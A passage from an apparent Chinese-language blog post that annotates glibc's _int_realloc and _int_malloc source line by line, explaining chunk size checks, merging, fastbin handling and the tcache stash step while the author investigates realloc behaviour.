//检查oldp的大小是否小于等于chunk头大小 如果小于等于 那么oldp明显不正常</span><br><span class="line">      || __builtin_expect (oldsize &gt;= av-&gt;system_mem, 0))  //检查oldsize是否大于等于系统内存总量</span><br><span class="line">    malloc_printerr (&quot;realloc(): invalid old size&quot;);</span><br><span class="line"></span><br><span class="line">  check_inuse_chunk (av, oldp);  //检查oldp指向的内存块是否处于使用中</span><br><span class="line"></span><br><span class="line">  /* All callers already filter out mmap&#x27;ed chunks.  */</span><br><span class="line">  assert (!chunk_is_mmapped (oldp));   //前面已经处理干净了mmap分配的内存块 这里检查一下</span><br><span class="line"></span><br><span class="line">  next = chunk_at_offset (oldp, oldsize);  //获取下一个内存块</span><br><span class="line">  INTERNAL_SIZE_T nextsize = chunksize (next);  //获取下一个内存块的大小</span><br><span class="line">  if (__builtin_expect (chunksize_nomask (next) &lt;= CHUNK_HDR_SZ, 0)  //检查下一个内存块的大小是否小于等于chunk头大小</span><br><span class="line">      || __builtin_expect (nextsize &gt;= av-&gt;system_mem, 0))  //检查下一个内存块的大小是否大于等于系统内存总量</span><br><span class="line">    malloc_printerr (&quot;realloc(): invalid next size&quot;);</span><br><span class="line"></span><br><span class="line">  if ((unsigned long) (oldsize) &gt;= (unsigned long) (nb))  //检查oldsize是否大于等于nb</span><br><span class="line">    &#123;</span><br><span class="line">      /* already big enough; split below */</span><br><span class="line">      newp = oldp;       //如果oldsize大于重分配的size 就不重新申请chunk 而是切割oldp</span><br><span class="line">      newsize = oldsize;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  else</span><br><span class="line">    &#123;</span><br><span class="line">      /* Try to expand forward into top */</span><br><span class="line">      if (next == av-&gt;top &amp;&amp;    //如果下一个chunk是top chunk 就扩展oldp</span><br><span class="line">          (unsigned long) (newsize = oldsize + nextsize) &gt;=</span><br><span class="line">          (unsigned long) (nb + MINSIZE))</span><br><span class="line">        &#123;</span><br><span class="line">          set_head_size (oldp, nb | (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br><span class="line">          av-&gt;top = chunk_at_offset (oldp, nb);</span><br><span class="line">          set_head (av-&gt;top, (newsize - nb) | PREV_INUSE);</span><br><span class="line">          check_inuse_chunk (av, oldp);</span><br><span class="line">          return tag_new_usable (chunk2mem (oldp));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      /* Try to expand forward into next chunk;  split off remainder below */</span><br><span class="line">      else if (next != av-&gt;top &amp;&amp;   //如果下一个chunk(free状态)的大小和oldpsize加起来大于等于nb 就合并oldp和nextchunk 然后重分配</span><br><span class="line">               !inuse (next) &amp;&amp;</span><br><span class="line">               (unsigned long) (newsize = oldsize + nextsize) &gt;=</span><br><span class="line">               (unsigned long) (nb))</span><br><span class="line">        &#123;</span><br><span class="line">          newp = oldp;</span><br><span class="line">          unlink_chunk (av, next);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      /* allocate, copy, free */</span><br><span class="line">      else  //如果上述的特殊情况都不满足 就按照malloc-copy-free的流程来</span><br><span class="line">        &#123;</span><br><span class="line">          newmem = _int_malloc (av, nb - MALLOC_ALIGN_MASK);</span><br><span class="line">          if (newmem == 0)</span><br><span class="line">            return 0; /* propagate failure */</span><br><span class="line"></span><br><span class="line">          newp = mem2chunk (newmem);</span><br><span class="line">          newsize = chunksize (newp);</span><br><span class="line"></span><br><span class="line">          /*</span><br><span class="line">             Avoid copy if newp is next chunk after oldp.</span><br><span class="line">           */</span><br><span class="line">          if (newp == next)  //这里比较疑惑 用于检测newp是不是next chunk 如果是的话就按照合并oldp和next chunk算 但是正常来说 前面已经处理过这种情况了</span><br><span class="line">            &#123;</span><br><span class="line">              newsize += oldsize;</span><br><span class="line">              newp = oldp;</span><br><span class="line">            &#125;</span><br><span class="line">          else</span><br><span class="line">            &#123;</span><br><span class="line">	      void *oldmem = chunk2mem (oldp);</span><br><span class="line">	      size_t sz = memsize (oldp);</span><br><span class="line">	      (void) tag_region (oldmem, sz);  //标记旧内存区域</span><br><span class="line">	      newmem = tag_new_usable (newmem);  //标记新内存区域可用</span><br><span class="line">	      memcpy (newmem, oldmem, sz);</span><br><span class="line">	      _int_free (av, oldp, 1); </span><br><span class="line">	      check_inuse_chunk (av, newp); </span><br><span class="line">	      return newmem; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  /* If possible, free extra space in old or extended chunk */</span><br><span class="line"></span><br><span class="line">  assert ((unsigned long) (newsize) &gt;= (unsigned long) (nb));  //判断重分配后的chunk大小是否大于需要分配的大小 即检测是否有多余的空间</span><br><span class="line"></span><br><span class="line">  remainder_size = newsize - nb;</span><br><span class="line"></span><br><span class="line">  if (remainder_size &lt; MINSIZE)   /* not enough extra to split off */</span><br><span class="line">    &#123;   //如果剩余的空间小于最小的chunk大小 那么就设置一些chunk的基础信息然后返回</span><br><span class="line">      set_head_size (newp, newsize | (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br><span class="line">      set_inuse_bit_at_offset (newp, newsize);</span><br><span class="line">    &#125;</span><br><span class="line">  else   /* split remainder */</span><br><span class="line">    &#123;  //相反 如果有多余的空间 就切割出来为新的chunk</span><br><span class="line">      remainder = chunk_at_offset (newp, nb);</span><br><span class="line">      /* Clear any user-space tags before writing the header.  */</span><br><span class="line">      remainder = tag_region (remainder, remainder_size);</span><br><span class="line">      set_head_size (newp, nb | (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br><span class="line">      set_head (remainder, remainder_size | PREV_INUSE |</span><br><span class="line">                (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br><span class="line">      /* Mark remainder as inuse so free() won&#x27;t complain */</span><br><span class="line">      set_inuse_bit_at_offset (remainder, remainder_size);</span><br><span class="line">      _int_free (av, remainder, 1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  check_inuse_chunk (av, newp);</span><br><span class="line">  return tag_new_usable (chunk2mem (newp));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>int_realloc的主要逻辑都是通过下面这个if分支来 这里着重来分析一波</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">else  //如果上述的特殊情况都不满足 就按照malloc-copy-free的流程来</span><br><span class="line">        &#123;</span><br><span class="line">          newmem = _int_malloc (av, nb - MALLOC_ALIGN_MASK);</span><br><span class="line">          if (newmem == 0)</span><br><span class="line">            return 0; /* propagate failure */</span><br><span class="line"></span><br><span class="line">          newp = mem2chunk (newmem);</span><br><span class="line">          newsize = chunksize (newp);</span><br><span class="line"></span><br><span class="line">          /*</span><br><span class="line">             Avoid copy if newp is next chunk after oldp.</span><br><span class="line">           */</span><br><span class="line">          if (newp == next)  //这里比较疑惑 用于检测newp是不是next chunk 如果是的话就按照合并oldp和next chunk算 但是正常来说 前面已经处理过这种情况了</span><br><span class="line">            &#123;</span><br><span class="line">              newsize += oldsize;</span><br><span class="line">              newp = oldp;</span><br><span class="line">            &#125;</span><br><span class="line">          else</span><br><span class="line">            &#123;</span><br><span class="line">	      void *oldmem = chunk2mem (oldp);</span><br><span class="line">	      size_t sz = memsize (oldp);</span><br><span class="line">	      (void) tag_region (oldmem, sz);  //标记旧内存区域</span><br><span class="line">	      newmem = tag_new_usable (newmem);  //标记新内存区域可用</span><br><span class="line">	      memcpy (newmem, oldmem, sz);</span><br><span class="line">	      _int_free (av, oldp, 1); </span><br><span class="line">	      check_inuse_chunk (av, newp); </span><br><span class="line">	      return newmem; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>开头先调用int_malloc(注意 这里是int_malloc 正如realloc一样 malloc也有int和libc两种形式 一般我们通过程序调用的是libc_malloc 所以就会出现 之前发现的明明tcachebin中有合适的chunk 但是却不会申请到了 具体是哪里的分支绕走了 又如何解决 还需要接着往下分析)<br>接下来进行了一个check 检测new_chunk就是next_chunk 但是在此之前 已经单独对next_chunk是否可以用来扩展old_chunk做了判断 这里的if是为了避免int_malloc后 next_chunk变得可用了 而做的异常处理 不过这是为了防止啥样的特殊情况 我也想象不出来 希望在阅读int_malloc后能够得到结论<br>然后就是标准的copy-free了 由于free在实验过程中没有出现特别显著的问题 所以就先不看int_free的源码了 来看看int_malloc和libc_malloc有什么不同</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br></pre></td><td class="code"><pre><span class="line">static void *</span><br><span class="line">_int_malloc (mstate av, size_t bytes)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T nb;               /* normalized request size */</span><br><span class="line">  unsigned int idx;                 /* associated bin index */</span><br><span class="line">  mbinptr bin;                      /* associated bin */</span><br><span class="line"></span><br><span class="line">  mchunkptr victim;                 /* inspected/selected chunk */</span><br><span class="line">  INTERNAL_SIZE_T size;             /* its size */</span><br><span class="line">  int victim_index;                 /* its bin index */</span><br><span class="line"></span><br><span class="line">  mchunkptr remainder;              /* remainder from a split */</span><br><span class="line">  unsigned long remainder_size;     /* its size */</span><br><span class="line"></span><br><span class="line">  unsigned int block;               /* bit map traverser */</span><br><span class="line">  unsigned int bit;                 /* bit map traverser */</span><br><span class="line">  unsigned int map;                 /* current word of binmap */</span><br><span class="line"></span><br><span class="line">  mchunkptr fwd;                    /* misc temp for linking */</span><br><span class="line">  mchunkptr bck;                    /* misc temp for linking */</span><br><span class="line"></span><br><span class="line">#if USE_TCACHE</span><br><span class="line">  size_t tcache_unsorted_count;	    /* count of unsorted chunks processed */</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">  /*</span><br><span class="line">     Convert request size to internal form by adding SIZE_SZ bytes</span><br><span class="line">     overhead plus possibly more to obtain necessary alignment and/or</span><br><span class="line">     to obtain a size of at least MINSIZE, the smallest allocatable</span><br><span class="line">     size. Also, checked_request2size returns false for request sizes</span><br><span class="line">     that are so large that they wrap around zero when padded and</span><br><span class="line">     aligned.</span><br><span class="line">   */</span><br><span class="line"></span><br><span class="line">  if (!checked_request2size (bytes, &amp;nb))  //将请求的内存大小bytes加上chunk的头部大小</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (ENOMEM);</span><br><span class="line">      return NULL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  /* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span><br><span class="line">     mmap.  */</span><br><span class="line">  if (__glibc_unlikely (av == NULL))  //如果没有可用的内存分配区 调用sysmalloc通过mmap分配</span><br><span class="line">    &#123;</span><br><span class="line">      void *p = sysmalloc (nb, av);</span><br><span class="line">      if (p != NULL)</span><br><span class="line">	alloc_perturb (p, bytes);</span><br><span class="line">      return p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  /*</span><br><span class="line">     If the size qualifies as a fastbin, first check corresponding bin.</span><br><span class="line">     This code is safe to execute even if av is not yet initialized, so we</span><br><span class="line">     can try it without checking, which saves some time on this fast path.</span><br><span class="line">   */</span><br><span class="line"></span><br><span class="line">#define REMOVE_FB(fb, victim, pp)			\</span><br><span class="line">  do							\</span><br><span class="line">    &#123;							\  //从fastbin中取出chunk</span><br><span class="line">      victim = pp;					\</span><br><span class="line">      if (victim == NULL)				\</span><br><span class="line">	break;						\</span><br><span class="line">      pp = REVEAL_PTR (victim-&gt;fd);                                     \</span><br><span class="line">      if (__glibc_unlikely (pp != NULL &amp;&amp; misaligned_chunk (pp)))       \ //安全性检查 判断指针是否为空 是否对齐</span><br><span class="line">	malloc_printerr (&quot;malloc(): unaligned fastbin chunk detected&quot;); \</span><br><span class="line">    &#125;							\</span><br><span class="line">  while ((pp = catomic_compare_and_exchange_val_acq (fb, pp, victim)) \</span><br><span class="line">	 != victim);					\</span><br><span class="line"></span><br><span class="line">  if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ()))  //判断请求的大小是否处于fastbin的范围内</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);</span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx); //获取fastbin链表头</span><br><span class="line">      mchunkptr pp;</span><br><span class="line">      victim = *fb;</span><br><span class="line"></span><br><span class="line">      if (victim != NULL)</span><br><span class="line">	&#123;</span><br><span class="line">	  if (__glibc_unlikely (misaligned_chunk (victim)))</span><br><span class="line">	    malloc_printerr (&quot;malloc(): unaligned fastbin chunk detected 2&quot;);</span><br><span class="line"></span><br><span class="line">	  if (SINGLE_THREAD_P)</span><br><span class="line">	    *fb = REVEAL_PTR (victim-&gt;fd);</span><br><span class="line">	  else</span><br><span class="line">	    REMOVE_FB (fb, pp, victim); //多线程时从fastbin中取出chunk</span><br><span class="line">	  if (__glibc_likely (victim != NULL))  //安全性检查</span><br><span class="line">	    &#123;</span><br><span class="line">	      size_t victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">	      if (__builtin_expect (victim_idx != idx, 0))</span><br><span class="line">		malloc_printerr (&quot;malloc(): memory corruption (fast)&quot;);</span><br><span class="line">	      check_remalloced_chunk (av, victim, nb);</span><br><span class="line">#if USE_TCACHE  //这一部分就是以前学过的tcache stash机制 在fastbin中申请chunk后 如果链表中还有free chunk 就会把这些chunk放到tcachebin中</span><br><span class="line">	      /* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="line">		 stash them in the tcache.  */</span><br><span class="line">	      size_t tc_idx = csize2tidx (nb);</span><br><span class="line">	      if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">		&#123;</span><br><span class="line">		  mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">		  /* While bin not empty and tcache not full, copy chunks.  */</span><br><span class="line">		  while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count  //如果tcache对应size的链表还有空余 就转移chunk</span><br><span class="line">			 &amp;&amp; (tc_victim = *fb) != NULL)</span><br><span class="line">		    &#123;</span><br><span class="line">		      if (__glibc_unlikely (misaligned_chunk (tc_victim)))</span><br><span class="line">			malloc_printerr (&quot;malloc(): unaligned fastbin chunk detected 3&quot;);</span><br><span class="line">		      if (SINGLE_THREAD_P)</span><br><span class="line">			*fb = REVEAL_PTR (tc_victim-&gt;fd);</span><br><span class="line">		      else</span><br><span class="line">			&#123;</span><br><span class="line">			  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">			  if (__glibc_unlikely (tc_victim == NULL))</span><br><span class="line">			    break;</span><br><span class="line">			&#125;</span><br><span class="line">		      tcache_put (tc_victim, tc_idx);</span><br><span class="line">		    &#125;</span><br><span class="line">		&#125;</span><br><span class="line">#endif</span><br><span class="line">	      void *p = chunk2mem (victim);</span><br><span class="line">	      alloc_perturb (p, bytes);</span><br><span class="line">	      return p;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  /*</span><br><span class="line">     If a small request, check regular bin.  Since these &quot;smallbins&quot;</span><br><span class="line">     hold one size each, no searching within bins is necessary.</span><br><span 